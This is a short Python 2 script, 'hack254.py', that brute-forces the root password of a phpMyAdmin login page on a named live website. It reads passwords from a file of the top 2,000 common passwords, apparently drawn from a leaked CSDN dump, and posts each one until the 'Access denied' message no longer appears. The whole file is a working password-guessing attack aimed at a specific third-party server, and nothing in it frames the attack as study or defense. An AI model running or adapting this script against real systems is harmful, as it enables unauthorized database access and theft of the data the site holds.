#!/usr/bin/python
#coding:utf-8
#Filename : hack254.py
#Author   :   Will
import sys, os, urllib, urllib2, cookielib
targetUrl = 'http://bbs.totoroclub.com.cn/phpmyadmin/index.php'
# passDic = '/home/will/software/hack/data/Top500.txt'
passDic = '/home/will/software/hack/data/csdn/user/top2000_pw.txt'
def hack254(password,url):
	postData = {
		'pma_username':'root',
		'pma_password':password,
		'lang':'zh-utf-8',
		'convcharset':'iso-8859-1',
		'server':'1'
	}
	siteCookie = urllib2.HTTPCookieProcessor(cookielib.CookieJar());
	opener = urllib2.build_opener(siteCookie)	
	req = urllib2.Request(targetUrl, urllib.urlencode(postData))
	try:
		html = opener.open(req, timeout=30).read()
		if html.find('Access denied for user') < 0:
			print html.find('Access denied for user')
			print password+" suc!"
			sys.exit()
		else:
			print password+' fail!'
		opener.close()
	except Exception:
		print password+' Timeout!'
		pass

i = 0
f = file(passDic)
while True:
	line = f.readline()
	if len(line) == 0:
		break
	hack254(line.strip(),targetUrl)
	i += 1
	print 'line[%d]' % i
f.close()

